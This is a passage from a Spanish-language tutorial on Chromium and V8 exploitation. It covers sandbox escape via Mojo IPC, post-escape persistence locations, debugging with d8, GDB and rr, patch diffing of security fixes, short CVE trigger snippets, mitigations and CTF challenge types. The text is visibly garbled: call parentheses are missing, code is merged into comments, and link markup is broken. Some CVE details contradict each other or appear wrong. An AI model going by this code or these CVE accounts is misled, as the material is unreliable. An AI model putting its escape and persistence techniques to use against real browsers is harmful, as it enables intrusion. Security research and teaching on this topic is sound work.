2. Procesar microtasks (Promises, MutationObservers)
3. Procesar macrotasks (eventos DOM, timers)
```

Cuando un evento se procesa, el handler se ejecuta sincrónicamente.

#### 6.4.2. Reentrada Peligrosa

```javascript
button.addEventListener("click",  => { // Durante la ejecución de este handler, si otro evento dispara código // que modifica el estado..
});

button.click;  // Dispara el handler inmediatamente
```

### 6.5. Shadow DOM y Custom Elements

#### 6.5.1. vulnerabilidades en Custom Elements

```javascript
class MyElement extends HTMLElement { connectedCallback { // Se llama cuando se inserta al DOM // Aquí podría haber race conditions } disconnectedCallback { // Se llama cuando se elimina del DOM // Si aquí se accede a los hijos.. UAF }
}
customElements.define("my-elem", MyElement);
```

#### 6.5.2. Ciclo de Vida de Custom Elements

El ciclo de vida (construct, connected, disconnected, attributeChanged) ofrece múltiples puntos donde pueden ocurrir bugs de timing y reentrada.

---

## 7. Sandbox Escape en Chromium

### 7.1. Entendiendo el Sandbox

#### 7.1.1. Límites del Sandbox

El sandbox del renderer restringe:
- **[sistema de archivos](../raw/0s-f0nd4m3nt0s.md#sistema-de-archivos):** No se puede leer/escribir archivos arbitrarios.
- **procesos:** No se puede crear nuevos procesos.
- **[red](../raw/r3d3s-f0nd4m3nt0s.md):** Acceso limitado a conexiones de [red](../raw/r3d3s-f0nd4m3nt0s.md).
- **Sistema:** No se pueden hacer syscalls peligrosas.

**Lo que el sandbox permite:**
- comunicarse con el browser process via ipC.
- Usar recursos compartidos vía Mojo interfaces.
- Acceder a memoria del renderer (pero solo la propia).

#### 7.1.2. Lo que el Sandbox Permite y No Permite

| Operación | ¿Permitida? |
|-----------|------------|
| Leer archivos locales | No |
| Escribir archivos locales | No |
| Conexiones [tcp](../raw/r3d3s-f0nd4m3nt0s.md#tcp)/[udp](../raw/r3d3s-f0nd4m3nt0s.md#udp) | Limitado |
| Crear ventanas | No |
| Ejecutar programas | No |
| Acceder a process memory del browser | No |
| IPC con browser process | Sí |
| WebGL/GPU operations | Limitado |

#### 7.1.3. Syscalls Filtradas (seccomp-bpf en Linux)

```c
// Syscalls permitidas típicamente en el sandbox:
// read, write, close, fstat, mmap, mprotect, munmap
// futex, clock_gettime, getrandom
// sched_yield
// .. pero NO: open, execve, fork, clone, ptrace, ioctl
```

### 7.2. IPC y Mojo

#### 7.2.1. Arquitectura de Mojo

Mojo es el sistema IPC de Chromium con tres abstracciones:
- **MessagePipe:** Canal bidireccional para mensajes.
- **DataPipe:** Canal unidireccional para streaming.
- **SharedBuffer:** Memoria compartida.

Cada Mojo interface define endpoints (receiver/remote):
```cpp
// C++ lado browser
mojo::Remote<network::mojom::URLLoader> loader;
// C++ lado renderer
mojo::Receiver<network::mojom::URLLoaderClient> client(this);
```

#### 7.2.2. Message Pipes

Los MessagePipes envían mensajes serializados. El formato es:
```
Header (size, flags, ID)
Payload (datos serializados)
Handles (descriptores de pipe/shared buffers)
```

Un bug en la serialización/deserialización puede llevar a type confusion en el lado receptor.

#### 7.2.3. Data Pipes

DataPipes son para streaming de datos. Usan un buffer circular compartido. Bugs en la gestión de offsets del buffer circular pueden llevar a lecturas/escrituras OOB.

#### 7.2.4. Shared Buffers

Shared buffers son regiones de memoria compartida entre procesos. Si el renderer puede modificar el tamaño o contenido antes de que el browser lo procese, hay un time-of-check/time-of-use (TOCTOU) bug.

#### 7.2.5. Mojo JS Bindings

JavaScript puede acceder a interfaces Mojo limitadas. Por ejemplo:
```javascript
// Ciertas APIs web internas usan Mojo internamente
// navigator.mediaDevices.getUserMedia usa Mojo internamente
```

En los primeros días, las Mojo JS bindings estaban más expuestas. Hoy en día están más restringidas, pero bugs en la validación pueden permitir acceso no autorizado.

### 7.3. Técnicas de Sandbox Escape

#### 7.3.1. IPC Hijacking

Si tenemos arbitrary R/W en el renderer, podemos modificar estructuras de Mojo pipes:

```cpp
// Mojo struct in renderer memory:
struct MojoMessage { uint64_t size; uint64_t type; void* payload; // ..
};
```

Modificando el `type` podemos enviar mensajes de un tipo no esperado al browser, causando type confusion en el deserializador del browser process.

#### 7.3.2. Mojo Interface Confusion

```cpp
// Interface A tiene método A::foo(int x)
// Interface B tiene método B::bar(SomeStruct s)
// Si confundimos el routing del mensaje:
// - Enviamos mensaje con formato de A::foo
// - Lo recibe B::bar
// - Deserialización confunde int con SomeStruct
```

#### 7.3.3. Abuso de Servicios Privilegiados

**Network Service:** Desde el renderer podemos solicitar conexiones de red. Bugs en el network service pueden dar:
- Acceso a intranet ([ssrf](../raw/w3b-h4ck1ng.md#ssrf) bypass)
- File:// protocol access

**GPU Service:** Bugs en el procesamiento de shaders o texturas pueden dar:
- Read de memoria del [proceso](../raw/0s-f0nd4m3nt0s.md#procesos) GPU
- Write a memoria de video

**Storage Service:** Bugs en IndexedDB, File System Access API, etc.

#### 7.3.4. Resource Exhaustion

Agotar recursos del browser process:
- Crear miles de file handles.
- Asignar memoria masiva.
- Esto puede llevar a condiciones de error manejadas incorrectamente.

#### 7.3.5. File System Access via Blob IPC

```javascript
// Crear Blob y enviarlo via IPC
let blob = new Blob(["data"], {type: "text/plain"});
let url = URL.createObjectURL(blob);
// El blob existe en el browser process
// Si podemos hacer que el browser process lea un path diferente al que esperamos..
```

#### 7.3.6. Abuso de File Reader API

```javascript
let fileInput = document.createElement("input");
fileInput.type = "file";
// Si podemos engañar al browser process para que lea un archivo
// que no deberíamos poder leer..
```

### 7.4. Ejemplos Históricos de Escape

#### 7.4.1. [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2019-13768 (Blob URL UAF)

- UAF en el manejo de Blob URLs en el browser process.
- Al crear y liberar Blobs de cierta manera, se mantenía una referencia dangling.
- UAF en browser process → [rce](../raw/w3b-h4ck1ng.md#rce) fuera del sandbox.

#### 7.4.2. CVE-2020-16040 (Mojo Type Confusion)

- Type confusion en Simplified Lowering de TurboFan.
- Permitía R/W arbitraria en el renderer.
- Luego se combinaba con un escape Mojo para RCE completa.

#### 7.4.3. CVE-2021-30563 (Mojo Interface Validation)

- Bug en la validación de interfaces Mojo.
- Permitía enviar mensajes mal formados que causaban OOB en el browser process.

### 7.5. Post-Sandbox [privilege escalation](../raw/l1n9x-pr1v3sc.md)

#### 7.5.1. Ejecución en Browser Process

Una vez fuera del sandbox (en el browser process), no tenemos [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) completos aún:
- El browser process corre como usuario (no root/admin).
- Hay mitigaciones como Process Mitigation Policies en Windows.

#### 7.5.2. [persistencia](../raw/w1nd0ws-p0st3xpl01t.md#persistencia) en el Sistema

Con ejecución en el contexto del browser process:
- **Linux:** Escribir [cron](../raw/l1n9x-pr1v3sc.md#cron-jobs) jobs, SSH keys, ~/.bashrc, ~/.config/autostart
- **Windows:** Run registry keys, scheduled tasks, startup folder
- **macOS:** LaunchAgents, .bash_profile

---

## 8. Herramientas del Oficio

### 8.1. d8 — [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) Shell

#### 8.1.1. compilación de d8

```bash
# En Linux:
git clone https://chromium.googlesource.com/chromium/tools/depot_tools.git
export PATH=$PWD/depot_tools:$PATH

# Obtener V8 source
fetch v8
cd v8

# Compilar d8 con debugging symbols
gn gen out/debug --args='is_debug=true symbol_level=2 v8_enable_sandbox=false'
ninja -C out/debug d8

# Compilar d8 release
gn gen out/release --args='is_debug=false v8_enable_sandbox=false'
ninja -C out/release d8
```

#### 8.1.2. Flags Importantes

```bash
# Mostrar bytecode
d8 --print-bytecode script.js

# Trazar optimizaciones
d8 --trace-opt script.js

# Trazar deoptimizaciones
d8 --trace-deopt script.js

# Código JITeado (ASM)
d8 --print-opt-code script.js

# Trazar TurboFan
d8 --trace-turbo script.js

# Ver código de funciones específicas
d8 --turbo-filter=nombreFuncion script.js

# Trazar ICs
d8 --trace-ic script.js

# Trazar GC
d8 --trace-gc script.js

# Sintaxis natives (para debugging V8)
d8 --allow-natives-syntax script.js

# Deshabilitar JIT (solo intérprete)
d8 --jitless script.js

# V8 Sandbox
d8 --enable-sandbox script.js
```

#### 8.1.3. Debugging con d8

```javascript
// %DebugPrint(obj) - Muestra info detallada
// Requiere --allow-natives-syntax
let obj = { x: 1, y: 2 };
%DebugPrint(obj);

// %HasFastProperties(obj)
// %GetMap(obj)
// %OptimizeFunctionOnNextCall(fn)
// %NeverOptimizeFunction(fn)
// %DeoptimizeFunction(fn)
// %ClearFunctionFeedback(fn)
```

#### 8.1.4. Ejercicios con d8

```javascript
// Ejercicio: Ver el bytecode de una función
function add(a, b) { return a + b;
}
// Correr con: --print-bytecode

// Ejercicio: Ver optimizaciones
function loop(arr) { let s = 0; for (let i = 0; i < arr.length; i++) { s += arr[i]; } return s;
}
// Llamar 100000 veces, ver con --trace-opt
```

### 8.2. GDB para V8

#### 8.2.1. Instalación y Configuración

```bash
# gdb con soporte python
sudo apt install gdb python3 python3-pip

# V8 helper scripts
git clone https://chromium.googlesource.com/chromium/src/tools/gdb/
# En .gdbinit añadir:
# source /path/to/gdb/v8/GDBJIT.py
```

#### 8.2.2. GDB Init File para V8 (v8init.gdb)

```gdb
set pagination off
set confirm off

# Comandos V8 útiles
define job print *(v8::internal::Object*)($arg0)
end

define jstag print $arg0 & 1
end

define jt print /x (uint64_t)$arg0
end

define dla # Decompile loaded assembly disassemble /r $arg0 $arg0+$arg1
end
```

#### 8.2.3. Macros Útiles

```gdb
# job (Object dump): Muestra un objeto V8
# jt (Tagged pointer): Muestra un tagged pointer como hex
# dla (Disassemble): Desensambla código JITeado

# Ejemplo de uso:
# (gdb) job 0x3e8f00000001
# (gdb) jt $rax
```

#### 8.2.4. Breakpoints en funcioniones)es Clave

```gdb
# Breakpoints importantes para exploit development:

# V8 compilation
b Builtins_InterpreterEntryTrampoline
b CompileLazy
b TurboFan::Compile

# GC
b v8::internal::Heap::CollectGarbage
b v8::internal::MarkCompactCollector::CollectGarbage

# Allocation
b v8::internal::Heap::AllocateRawWithRetry

# Array bounds check
b v8::internal::ElementsAccessorBase::GetElementImpl
```

#### 8.2.5. Análisis de HeapObjects en GDB

```gdb
# Ver un HeapObject
(gdb) job 0x3fc012345678
0x3fc012345678: [JSObject]
 - map: 0x3fc087654321 <Map(HOLEY_ELEMENTS)>
 - prototype: 0x3fc0..
 - elements: 0x3fc0.. <FixedArray[3]>
 - properties: 0x3fc0.. <EmptyFixedArray>
 - in-object properties: - x: 1 (Smi) - y: 2 (Smi)

# Ver el Map de un objeto
(gdb) job *(v8::internal::Map*)0x3fc087654321
```

### 8.3. GDBjit

#### 8.3.1. Plugin GDBJIT

GDBJIT permite desensamblar código generado por el [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) directamente desde GDB.

```python
# En .gdbinit o script:
import gdb
import sys
sys.path.insert(0, '/path/to/v8/tools/gdb')
import gdbv8

gdbv8.init
```

#### 8.3.2. Visualización de Código JITeado

```gdb
(gdb) disassemble $pc
```

Si el PC está en código JITeado, GDBJIT puede mostrar las funciones V8 correspondientes.

### 8.4. rr — Record and Replay

rr es una herramienta de grabación y reproducción determinista. Es esencial para [exploit](../raw/m3t4spl01t.md#exploits) development de navegadores.

#### 8.4.1. Instalación de rr

```bash
# Linux
sudo apt install rr

# Verificar compatibilidad
rr check
```

#### 8.4.2. Grabación de una Ejecución

```bash
# Grabar d8 ejecutando un script
rr record d8 --allow-natives-syntax --print-opt-code exploit.js

# También se puede grabar Chrome directamente
rr record google-chrome --disable-gpu --no-sandbox
```

#### 8.4.3. Reproducción Determinista

```bash
# Reproducir la última grabación
rr replay

# El resultado es idéntico cada vez que se reproduce
```

#### 8.4.4. Reverse-Continue (rc, rn)

```bash
# En GDB dentro de rr replay:
(gdb) continue # Avanzar
(gdb) reverse-continue  # Retroceder (¡vuelve atrás en el tiempo!)
(gdb) reverse-next # Retroceder una instrucción
```

Esto permite:
- Ir hacia atrás hasta justo antes del crash.
- Ver en qué estado estaban las variables.
- Encontrar exactamente dónde ocurrió la corrupción.

#### 8.4.5. Uso Combinado con GDB

```bash
rr replay
(gdb) b *0x7f1234567890  # Breakpoint en dirección JITeada
(gdb) rc # Reverse-continue al crash
(gdb) rn # Paso atrás
(gdb) print $rax # Ver estado de registros
```

#### 8.4.6. rr en Exploit Development

El flujo típico:
1. Ejecutar el trigger del exploit bajo rr record.
2. Si crashea, rr replay + GDB.
3. Reverse-continue hasta justo antes del crash.
4. Analizar el estado de la memoria.
5. Ajustar el exploit (offsets, addresses) y repetir.

### 8.5. LLDB para macOS

#### 8.5.1. Configuración para V8

```bash
# En ~/.lldbinit:
command script import /path/to/v8/tools/lldb/v8lldb.py
```

#### 8.5.2. Comandos Útiles

```lldb
(lldb) job 0x12345678  # Mostrar objeto V8
(lldb) jst $rax # Mostrar tagged register

# Breakpoints en funciones V8:
(lldb) b Builtins_InterpreterEntryTrampoline
(lldb) b CompileLazy
```

### 8.6. BugID / [cluster](../raw/k8s-d33p-d1v3.md#cluster)-d33p-d1v3.md#[cluster](../raw/k8s-d33p-d1v3.md#cluster))-d33pFuzz

#### 8.6.1. Cómo Funciona ClusterFuzz

ClusterFuzz es el sistema de [fuzzing](../raw/fuzz1ng.md) de Google para Chromium:
- fuzzers ([libfuzzer](../raw/fuzz1ng.md#libfuzzer), [afl](../raw/fuzz1ng.md#afl)) generan casos de prueba.
- ClusterFuzz minimiza los casos que crashean.
- Asigna severidad y bisecta para encontrar el commit malo.
- Reporta automáticamente a los desarrolladores.

#### 8.6.2. Reproducción Local de Bugs

```bash
# Descargar un test case de ClusterFuzz (o de crbug.com)
wget https://crbug.com/XXXXXXX/testcase.js

# Reproducir con d8
d8 --allow-natives-syntax testcase.js

# Si crashea en Chrome:
google-chrome --no-sandbox --test-type testcase.html
```

#### 8.6.3. Test Cases Minimizados

ClusterFuzz minimiza los test cases automáticamente. Un test case de 1000 líneas puede reducirse a 30-50 líneas manteniendo el crash.

```javascript
// Test case minimizado típico:
function trigger { // .. código mínimo que dispara el bug
}
for (let i = 0; i < 100000; i++) trigger;
```

### 8.7. Lighthouse y Chromium DevTools

#### 8.7.1. DevTools para Research

- **Performance tab:** Profiling de JS, GC pauses.
- **Memory tab:** Heap snapshots para analizar objetos.
- **Sources tab:** Debugging con breakpoints.

#### 8.7.2. Memory Tab y Heap Snapshots

Se pueden tomar snapshots del heap para analizar:
- Cuántos objetos de cada tipo hay.
- Qué objetos retienen memoria.
- Estructura de Maps y prototipos.

---

## 9. Patch Diffing y 1-Day Analysis

### 9.1. Fundamentos de Patch Diffing

#### 9.1.1. Diferencia entre Parches

Patch diffing compara el código antes y después del fix para entender la vulnerabilidades).

```bash
# Clonar V8 y hacer diff de un commit
git log --oneline | grep -i security
git show <commit_hash>  # Ver el diff completo
```

#### 9.1.2. Análisis de Commits de Chromium

Los commits de seguridad en Chromium pueden estar ocultos hasta que se libera el parche. Se pueden encontrar en:
- **chromium-review.googlesource.[com](../raw/w1n-s9bsyst3ms.md#com):** Code review público.
- **crbug.com:** Bug tracker (con restricciones).

#### 9.1.3. Identificación de Zonas Afectadas

```bash
# En el diff, buscar:
# +  // Security: fix type confusion
# +  // Fixed: CVE-2021-XXXXX
# -  // Old (vulnerable) code
# +  // New (fixed) code

# Palabras clave en mensajes de commit:
# - "security:"
# - "safer bounds checking"
# - "check type"
# - "validate input"
# - "ensure correct"
```

### 9.2. Repositorios y Fuentes

#### 9.2.1. Chromium Gerrit (crbug.com)

```bash
# Buscar bugs en crbug.com
# https://crbug.com/?q=Security_Severity%3DHigh&can=1

# Obtener detalles del bug:
curl -s "https://crbug.com/XXXXXXX?format=json"
```

#### 9.2.2. [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) Git

```bash
# Repositorio V8
git clone https://chromium.googlesource.com/v8/v8.git
cd v8

# Ver cambios recientes
git log --oneline -50

# Buscar commits con "CVE" en el mensaje
git log --oneline --grep="CVE"
```

#### 9.2.3. Google Project Zero Blog

Project Zero publica análisis detallados de bugs de [navegador](../raw/br0ws3r-3xpl01t4t10n.md):
- httpss)://googleprojectzero.blogspot.com/
- Análisis de bugs 0-day y n-day.

#### 9.2.4. ZDI Advisories

Zero Day Initiative publica advisories con detalles técnicos:
- [https](../raw/r3d3s-f0nd4m3nt0s.md#https)://www.zerodayinitiative.com/advisories/
- Incluyen [cve](../raw/s3c-f0nd4m3nt0s.md#cve), vector, y a veces PoC.

### 9.3. Backport Identification

#### 9.3.1. Cómo Identificar Backports de Seguridad

```bash
# En el log de V8, buscar merges a ramas estables:
git log --oneline branch-heads/XXXX

# Ramas estables típicas:
# branch-heads/9.0
# branch-heads/9.1
# ..etc
```

#### 9.3.2. Merges a Ramas Estables

Los backports de seguridad son merges a ramas estables. A menudo no se anuncian públicamente:

```bash
# Comparar rama estable con main
git log main.branch-heads/XXXX --oneline

# Buscar parches de seguridad en la rama estable
git log --oneline branch-heads/XXXX | grep -i "security\|CVE\|type confusion\|OOB\|UAF"
```

#### 9.3.3. Análisis de Fechas y Mensajes de Commit

```bash
# Ver la fecha del commit de seguridad
git show --stat <hash>

# El commit de fix a menudo dice cosas como:
# "[turbofan] Fix bounds check elimination"
# "[simplified-lowering] Ensure correct type"

# Si el mensaje es vago ("Fix crash"), buscar por archivos modificados
```

### 9.4. De Patch a [exploit](../raw/m3t4spl01t.md#exploits)

#### 9.4.1. Entendiendo el Fix

```diff
// Antes (vulnerable):
-  if (input < length) {
- return elements[input];  // Sin bounds check?
-  }

// Después (fixed):
+  if (input >= length || input < 0) {
+ throw new RangeError;
+  }
+  return elements[input];
```

#### 9.4.2. Construyendo el Trigger Original

```javascript
// Basado en el diff, entender qué trigger causa el bug:
// - ¿Qué condiciones debe cumplir input?
// - ¿Cómo hacer que length se calcule mal?
function trigger { let arr = [1.1, 2.2, 3.3]; // .. return arr[exploit_index];  // OOB!
}
```

#### 9.4.3. Adaptación a la Versión Vulnerable

```bash
# 1. Identificar la versión vulnerable
git checkout <commit_anterior_al_fix>

# 2. Compilar d8 vulnerable
gn gen out/vuln --args='is_debug=false'
ninja -C out/vuln d8

# 3. Probar el trigger
out/vuln/d8 --allow-natives-syntax trigger.js

# 4. Si crashea, empezar a escribir el exploit
```

### 9.5. Ejemplo Práctico: CVE-2021-21224

#### 9.5.1. El Commit del Fix

CVE-2021-21224 fue un bug en Simplified Lowering. El fix está en commit `e467011bdf7dc58e683c14c6e7c9c4b5477f3a0e` de V8.

```diff
// En src/compiler/simplified-lowering.cc
// Cambio en la representación de tipos para ciertos nodos
```

#### 9.5.2. Análisis del Bug

El bug ocurría cuando Simplified Lowering asignaba tipos incorrectos a nodos del grafo después de ciertas transformaciones. Esto permitía que bounds checks fueran eliminados incorrectamente.

#### 9.5.3. Trigger y Explotación

```javascript
// Trigger mínimo para CVE-2021-21224
function trigger(oob_index) { let arr = [1.1, 2.2, 3.3, 4.4]; let oob = arr[oob_index];  // Sin bounds check return oob;
}

// Calentar la función
for (let i = 0; i < 100000; i++) { trigger(i % 4);  // Índices válidos: feedback [0,1,2,3]
}

// Ahora llamar con índice malo
let leaked = trigger(100);  // OOB read!
```

---

## 10. Análisis de cvecs Reales

### 10.1. [cve](../raw/s3c-f0nd4m3nt0s.md#cve)-2020-6418 (Type Confusion en TurboFan)

#### 10.1.1. Descripción del Bug

**CVE-2020-6418** es un type confusion en el [[compilador](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#compiladores)](./raw/pr0gr4mm1ng TurboFan de [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8). Fue reportado por Clément Berthaux y activamente explotado en la naturaleza.

Ocurre en la función `SimplifyStringToLower` donde TurboFan simplifica incorrectamente una operación de string.

#### 10.1.2. Trigger Mínimo

```javascript
// Trigger CVE-2020-6418
function trigger(s) { // String.prototype.toLowerCase let lower = s.toLowerCase; // TypedArray set con length let length = lower.length; let arr = new Uint32Array(length); // .. return arr;
}

// Calentar
for (let i = 0; i < 100000; i++) { trigger("A".repeat(100);
}

// Llamada explotable
trigger("A".repeat(200);
```

#### 10.1.3. Explotación Paso a Paso

1. TurboFan especula que `s.toLowerCase.length` es "conocido".
2. Elimina bounds checks en el TypedArray basado en length.
3. Si length real es diferente al especulado → OOB.
4. OOB en TypedArray → arbitrary R/W → code execution.

### 10.2. CVE-2021-21224 (OOB en V8)

#### 10.2.1. Vulnerability Details

Similar a CVE-2020-16040, un bug en Simplified Lowering que permite OOB.

#### 10.2.2. Componente Afectado: Simplified Lowering Phase

El bug está en cómo Simplified Lowering maneja la transformación de nodos `NumberLessThan` y `SpeculativeNumberLessThan`.

#### 10.2.3. Trigger y Explotación

```javascript
function trigger(x) { let arr = [1.1, 2.2]; let oob = arr[Math.min(x, 100)];  // OOB si x es grande return oob;
}
```

### 10.3. CVE-2019-13720 (UAF en AudioContext)

#### 10.3.1. AudioContext Internals

AudioContext usa recursos del sistema que se asignan en el browser process. Al cerrar el contexto, hay una carrera entre:
- El código C++ que libera los recursos.
- El wrapper V8 que aún mantiene referencia.

#### 10.3.2. Race en el Destructor

```javascript
let ctx = new AudioContext;
let s = ctx.createScriptProcessor(4096, 1, 1);
s.connect(ctx.destination);

// Cerrar y recrear rápidamente
for (let i = 0; i < 100; i++) { ctx.close; ctx = new AudioContext;
}
// Race condition → UAF
```

#### 10.3.3. UAF para Arbitrary R/W

El UAF en un objeto C++ permite:
1. Reclamar la memoria liberada con otro objeto controlado.
2. Leer/escribir a través del objeto C++ corrupto.
3. Obtener R/W en el browser process (fuera del sandbox).

### 10.4. CVE-2021-30563 (Sandbox Escape via Mojo)

#### 10.4.1. Interfaz Mojo Vulnerable

CVE-2021-30563 fue un bug en la validación de interfaces Mojo. Una interfaz permitía tipos de datos incorrectos, causando que el browser process interpretara datos del renderer de manera errónea.

#### 10.4.2. IPC Message Confusion

```diff
// El bug: falta de validación de tipos en el deserializador
- // No se verificaba el tipo de handle
+ // Se añadió verificación del handle type
```

#### 10.4.3. Post-Escape [privilege escalation](../raw/l1n9x-pr1v3sc.md)

Una vez fuera del sandbox (en el browser process), se podía:
- Acceder al [sistema de archivos](../raw/0s-f0nd4m3nt0s.md#sistema-de-archivos) del usuario.
- Ejecutar comandos del sistema.
- Persistir en la máquina.

### 10.5. CVE-2020-16040 (OOB via Simplified Lowering)

#### 10.5.1. Análisis Técnico

Bug en Simplified Lowering donde la representación de tipos no se actualizaba correctamente después de transformaciones del grafo.

Similar a CVE-2021-21224 pero en una fase diferente del compilador.

#### 10.5.2. Trigger

```javascript
function trigger(x) { let arr = [1.1, 2.2, 3.3]; return arr[x];  // Sin bounds check para x grande
}
```

### 10.6. CVE-2022-2294 (WebRTC UAF)

#### 10.6.1. WebRTC Internals

WebRTC implementa comunicación en tiempo real. Los objetos SCTPTransport tienen un ciclo de vida complejo con threads y eventos.

#### 10.6.2. Race en SCTPTransport

```javascript
let pc = new RTCPeerConnection;
pc.close;  // Cierre del peer connection
// Race: el SCTPTransport se cierra mientras hay operaciones pendientes
```

El UAF ocurría al acceder a miembros del SCTPTransport después de su destrucción.

---

## 11. Mitigaciones Modernas

### 11.1. [v8](../raw/br0ws3r-3xpl01t4t10n.md#v8) Sandbox

#### 11.1.1. Cómo funcioniones)a el V8 Sandbox

Introducido en V8 10.x+, el V8 Sandbox (también llamado Heap Sandbox) aísla el heap de V8 del resto del [proceso](../raw/0s-f0nd4m3nt0s.md#procesos).

**Concepto:** El heap de V8 se asigna en una región de memoria virtual dedicada (llamada "cage" o jaula). Todos los punteros dentro del heap son relativos a esta región (offset-based pointers), no absolutos.

```
┌─────────────────────────────────────┐
│ Memoria del Proceso │
│  ┌───────────────────────────────┐ │
│  │ V8 Heap Cage (4GB max) │ │
│  │  ┌─────┬─────┬─────┬──────┐ │ │
│  │  │ Obj │ Map │ Arr │ ..  │ │ │
│  │  └─────┴─────┴─────┴──────┘ │ │
│  └───────────────────────────────┘ │
│  ┌───────────────────────────────┐ │
│  │  Memoria del Sistema │ │
│  │  (Backing stores, etc.) │ │
│  └───────────────────────────────┘ │
└─────────────────────────────────────┘
```

#### 11.1.2. Heap Cage y Pointer compression

El V8 Sandbox está íntimamente relacionado con **pointer compression** (compresión de punteros):

- **Punteros de 32 bits en lugar de 64 bits:** Dentro del cage, los punteros son offsets de 32 bits desde la base del cage.
- **Base del cage:** Almacenada en un registro de segmento (en [x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64): `gs` o `fs`).
- **Resultado:** Un [puntero](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#punteros) dentro del cage es solo un offset de 4 bytes, no 8 bytes. ¡reduce la memoria a la mitad!

**Cálculo de dirección absoluta:**
```cpp
// Base del cage: 0x100000000000
// Offset: 0x1234
// Dirección: 0x100000001234

// En código: cage_base + offset
```

#### 11.1.3. Nuevas Limitaciones para exploits

Con el V8 Sandbox, un atacante con R/W dentro del heap de V8 NO PUEDE:
- Modificar el backing store de un ArrayBuffer (está fuera del cage).
- Crear un fakeobj fuera del cage.
- Acceder a estructuras del proceso (stacks, heaps del sistema).
- Escalar a ejecución de código arbitrario directamente.

**Lo que el atacante aún puede hacer:**
- Manipular objetos V8 dentro del cage.
- Corromper Maps para cambiar tipos.
- Modificar length de arrays.
- Realizar addrof/fakeobj dentro del cage.

#### 11.1.4. Bypass Conocido Hasta la Fecha

El V8 Sandbox es extremadamente robusto. Los bypasses conocidos involucran:
1. Bugs en la implementación del propio sandbox (errores de hardening).
2. vulnerabilidades fuera de V8 (Blink, Mojo, etc.) que permiten R/W fuera del cage.
3. Abuse de APIs que cruzan el límite del sandbox (ej: external pointers mal manejados).

Hasta principios de 2024, no hay bypasses públicos del V8 Sandbox que funcionen en versiones fully-patched de Chrome.

### 11.2. Pointer Compression

#### 11.2.1. Detalles Técnicos

```cpp
// Compressed pointers:
// - En un objeto, los punteros son uint32_t (4 bytes en vez de 8)
// - Se descomprimen sumando la base del cage
// - Base del cage está en un registro reservado

// Antes de pointer compression:
struct HeapObject { Map* map; // 8 bytes // ..
};

// Con pointer compression:
struct HeapObject { uint32_t map; // 4 bytes (offset desde cage base) uint32_t dummy;  // 4 bytes padding // ..
};
```

#### 11.2.2. Impacto en Explotación

- **Más difícil hacer fakeobj:** El fakeobj debe tener un offset de 32 bits válido dentro del cage.
- **Menos gadgets:** Los objetos son más pequeños, menos espacio para overlflow.
- **Sin acceso directo a memoria fuera del cage:** Los punteros de 32 bits no pueden apuntar fuera del cage.

### 11.3. W^X [jit](../raw/br0ws3r-3xpl01t4t10n.md#jit) (Write XOR Execute)

#### 11.3.1. Política W^X en V8

Las páginas JIT de V8 nunca son RWX:
- Mientras se escribe: páginas RW (sin ejecución).
- Cuando se termina: páginas RX (sin escritura).
- Se necesita un "flip" de [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) (vía mmap/mprotect con flags específicos).

#### 11.3.2. Impacto en Wasm RWX Pages

Antes de W^X, se podía escribir shellcode directamente en páginas RWX. Después de W^X:

1. Ya no se puede escribir y ejecutar al mismo tiempo.
2. El código Wasm compilado se almacena en páginas RX.
3. Para modificar código, necesitas: - Recompilar el Wasm (con nuevo código). - Encontrar un bug para cambiar permisos de página. - Encontrar una página RW separada y saltar a ella.

### 11.4. Map / JSFunction Hardening

#### 11.4.1. Protección de Maps

Los Maps ahora tienen:
- **Chequeo de integridad:** El Map tiene sumas de verificación o checks de consistencia.
- **Read-only después de inicialización:** Los Maps no pueden ser modificados después de su creación.
- **Map::IsInplaceUpdateable** restricciones.

```cpp
// Antes: se podía modificar el Map de un objeto existente
// Después: los Maps son inmutables (más o menos)
```

#### 11.4.2. Protección de JSFunction

Las JSFunction (objetos que representan funciones JS) tienen:
- **Code pointer protegido:** No se puede modificar para apuntar a código arbitrario.
- **Context verificado:** El contexto debe ser válido.
- **Feedback vector check:** Debe ser consistente.

### 11.5. Control Flow Guard (CFG)

#### 11.5.1. Cómo Funciona en Windows

CFG (Control Flow Guard) es una mitigación de Windows que verifica los targets de indirect calls:

```cpp
// Sin CFG: cualquier dirección puede ser llamada
void (*func) = (void (*)arbitrary_address;
func;  // Si CFG no valida → call a dirección arbitraria

// Con CFG: la llamada se verifica contra una bitmap de direcciones válidas
void (*func) = ..;
__guard_check_icall_ptr(func);  // Verificación CFG
func;
```

#### 11.5.2. Bypasses

CFG no es infalible:
- **Módulos sin CFG:** Cargar una DLL sin CFG.
- **Gadgets CFG-compatibles:** Encontrar funciones válidas que hagan lo que necesitas.
- **Heavy CFG bypass:** Técnicas como Overwriting los .pdata o usar Vectored Exception Handling.

### 11.6. Integrity Checks (V8 Heap Sandbox)

El V8 Sandbox tiene checks de integridad:
- **Validación de pointers comprimidos:** Al descomprimir, se verifica que el offset esté dentro del cage.
- **Map checks:** Se verifica que el Map de un objeto sea válido y esté en una lista blanca.
- **Heap bounds check:** Al hacer alloc, se verifica que no se salga del cage.

### 11.7. Site Isolation y Process-per-Site

#### 11.7.1. Impacto en Fuga de Datos

Site Isolation previene ataques Spectre-type:
- Cada sitio tiene su propio proceso.
- Un atacante no puede leer la memoria de otro sitio.
- Incluso con R/W en el renderer, solo se puede acceder a datos del mismo sitio.

#### 11.7.2. Cross-Site Leak Prevention

No se pueden hacer:
- Cross-origin reads via [side channel](../raw/pqc-s1d3-ch4nn3ls.md#side-channel-attacks)-s1d3-ch4nn3ls.md#side-channel-attacks)-s1d3s.
- Cross-site search attacks.
- Cross-site data exfiltration via memory.

---

## 12. [ctf](../raw/ctf-h4ckth3b0x.md) Browser Challenges

### 12.1. Enfoque General para CTFs

#### 12.1.1. Categorización del Desafío

Los CTFs de browser se dividen en:

1. **Patch Diffing (1-day):** Te dan un binario con un parche aplicado. Debes encontrar el bug y explotarlo.
2. **Bug Trigger (0-day):** Te dan un binario y debes encontrar y explotar un bug sin parche.
3. **"Black Box":** Solo te dan el [navegador](../raw/br0ws3r-3xpl01t4t10n.md), sin código fuente.
